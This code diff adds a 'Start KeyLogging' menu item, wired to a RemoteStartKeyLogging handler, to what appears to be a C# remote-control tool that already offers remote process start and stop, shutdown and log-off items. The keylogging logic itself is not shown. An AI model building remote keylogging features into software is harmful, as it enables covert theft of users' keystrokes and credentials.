@@ -13,6 +13,7 @@ namespace ExternalControl
         private ToolStripMenuItem _restartWindowsToolStripMenuItem;
         private ToolStripMenuItem _logOffWindowsToolStripMenuItem;
         private ToolStripMenuItem _shutDownWindowsToolStripMenuItem;
+        private ToolStripMenuItem _startKeyLoggingToolStripMenuItem;
 
         public ToolStripMenuItem CreateMainMenu()
         {
@@ -28,10 +29,12 @@ namespace ExternalControl
             this._restartWindowsToolStripMenuItem = new ToolStripMenuItem();
             this._logOffWindowsToolStripMenuItem = new ToolStripMenuItem();
             this._shutDownWindowsToolStripMenuItem = new ToolStripMenuItem();
+            this._startKeyLoggingToolStripMenuItem = new ToolStripMenuItem();
             
             _externalProcessToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] {
             _startProcessToolStripMenuItem,
             _stopProcessToolStripMenuItem,
+            _startKeyLoggingToolStripMenuItem,
             _restartWindowsToolStripMenuItem,
             _logOffWindowsToolStripMenuItem,
             _shutDownWindowsToolStripMenuItem,
@@ -39,6 +42,11 @@ namespace ExternalControl
             _externalProcessToolStripMenuItem.Name = "externalProcessToolStripMenuItem";
             _externalProcessToolStripMenuItem.Size = new System.Drawing.Size(100, 20);
             _externalProcessToolStripMenuItem.Text = "ExternalControl";
+
+            _startKeyLoggingToolStripMenuItem.Name = "startKeyLoggingToolStripMenuItem";
+            _startKeyLoggingToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
+            _startKeyLoggingToolStripMenuItem.Text = "Start KeyLogging";
+            _startKeyLoggingToolStripMenuItem.Click += ServerControl.RemoteStartKeyLogging;
 
             _startProcessToolStripMenuItem.Name = "startProcessToolStripMenuItem";
             _startProcessToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
